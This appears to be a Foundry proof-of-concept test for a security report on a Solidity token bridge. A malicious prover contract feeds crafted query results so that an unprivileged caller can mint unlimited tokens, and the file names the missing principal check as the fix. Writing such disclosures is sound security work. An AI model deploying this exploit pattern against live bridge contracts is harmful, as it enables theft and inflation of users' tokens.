// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Run with:
//   cd gluwa/CCNext-smart-contracts
//   forge test --match-test test_unlimitedMint -vvvv

import "forge-std/Test.sol";
import {MintableUSCBridge} from "../contracts/MintableUSCBridge.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ICreditcoinPublicProver, QueryDetails, ResultSegment, QueryState, ChainQuery, LayoutSegment, Balance} from "@gluwa/creditcoin-public-prover/contracts/sol/Prover.sol";

// ── Concrete implementation (minimal – just what's needed to deploy) ─────────
// Must pass name/symbol to ERC20 base constructor.
contract ConcreteUSCBridge is MintableUSCBridge {
    constructor() MintableUSCBridge() ERC20("SpacecoinWrapped", "wSPC") {}
}

// ── Malicious prover ─────────────────────────────────────────────────────────
contract MaliciousProver {
    // keccak4("Transfer(address,address,uint256)") = 0xddf252ad
    bytes32 constant TRANSFER_SIG =
        0xddf252ad00000000000000000000000000000000000000000000000000000000;

    address public attacker;
    uint256 public mintAmount;

    constructor(address _attacker, uint256 _mintAmount) {
        attacker   = _attacker;
        mintAmount = _mintAmount;
    }

    /// @dev Implements ICreditcoinPublicProver.getQueryDetails
    ///      Returns crafted segments that pass every check in MintableUSCBridge.mintFromQuery
    function getQueryDetails(bytes32) external view returns (QueryDetails memory qd) {
        ResultSegment[] memory segs = new ResultSegment[](8);

        // segs[0..3]: padding — unused by mintFromQuery / _processUSCQuery
        // segs[4]: Event signature (first 4 bytes must == TRANSFER_EVENT_SIG)
        segs[4].abiBytes = TRANSFER_SIG;

        // segs[5]: "from" address  → tokens minted to this address
        segs[5].abiBytes = bytes32(uint256(uint160(attacker)));

        // segs[6]: "to" address  → must be address(0) to satisfy InvalidBurnAddress check
        segs[6].abiBytes = bytes32(0);

        // segs[7]: amount → arbitrary, we pick a large number
        segs[7].abiBytes = bytes32(mintAmount);

        LayoutSegment[] memory empty = new LayoutSegment[](0);
        qd.state          = QueryState.ResultAvailable;
        qd.query          = ChainQuery({chainId: 0, height: 0, index: 0, layoutSegments: empty});
        qd.escrowedAmount = Balance.wrap(0);
        qd.principal      = attacker;   // NOT checked by MintableUSCBridge (unlike UniversalBridgeProxy)
        qd.estimatedCost  = Balance.wrap(0);
        qd.timestamp      = 0;
        qd.resultSegments = segs;
    }
}

// ── PoC Test ─────────────────────────────────────────────────────────────────
contract MintableUSCBridgePoc is Test {

    ConcreteUSCBridge bridge;
    MaliciousProver   maliciousProver;

    address attacker = makeAddr("attacker");
    uint256 MINT_AMOUNT = 1_000_000 * 10**18;   // 1M tokens

    function setUp() public {
        bridge          = new ConcreteUSCBridge();
        maliciousProver = new MaliciousProver(attacker, MINT_AMOUNT);
    }

    /// @notice Demonstrates that an attacker with no special role can mint arbitrary tokens
    ///         by supplying a malicious prover address to mintFromQuery.
    function test_unlimitedMint() public {
        // Pre-state
        assertEq(bridge.balanceOf(attacker), 0, "attacker starts with 0 tokens");
        assertEq(bridge.totalSupply(),       0, "bridge starts with 0 supply");

        // Step 1: attacker calls mintFromQuery with their own prover — no role required
        bytes32 queryId1 = keccak256("attacker_queryId_1");
        vm.prank(attacker);
        bridge.mintFromQuery(address(maliciousProver), queryId1);

        // Assert first mint succeeded
        assertEq(bridge.balanceOf(attacker), MINT_AMOUNT, "1M tokens minted on first call");

        // Step 2: attacker repeats with a different queryId — unbounded minting
        bytes32 queryId2 = keccak256("attacker_queryId_2");
        vm.prank(attacker);
        bridge.mintFromQuery(address(maliciousProver), queryId2);

        assertEq(bridge.balanceOf(attacker), MINT_AMOUNT * 2, "2M tokens after second call");
        assertEq(bridge.totalSupply(),       MINT_AMOUNT * 2, "total supply inflated");

        console.log("=== ATTACK SUCCEEDED ===");
        console.log("Attacker balance:", bridge.balanceOf(attacker) / 10**18, "tokens");
        console.log("Total supply:    ", bridge.totalSupply()       / 10**18, "tokens");
        console.log("Root cause: mintFromQuery accepts any proverContractAddr with no");
        console.log("            check on queryDetails.principal (unlike UniversalBridgeProxy).");
    }

    /// @notice Shows the check that UniversalBridgeProxy has but MintableUSCBridge is missing.
    function test_missingPrincipalCheck() public view {
        // The secure sibling (UniversalBridgeProxy) calls:
        //   require(hasRole(DEFAULT_ADMIN_ROLE, queryDetails.principal))
        //
        // MintableUSCBridge._processUSCQuery never reads queryDetails.principal at all.
        // This test documents the gap — the fix is to add the above require().
        console.log("MintableUSCBridge._processUSCQuery does not check queryDetails.principal");
        console.log("UniversalBridgeProxy.uscBridgeCompleteMint DOES check it.");
        console.log("The code comment in UniversalBridgeProxy even describes this exact attack.");
    }
}
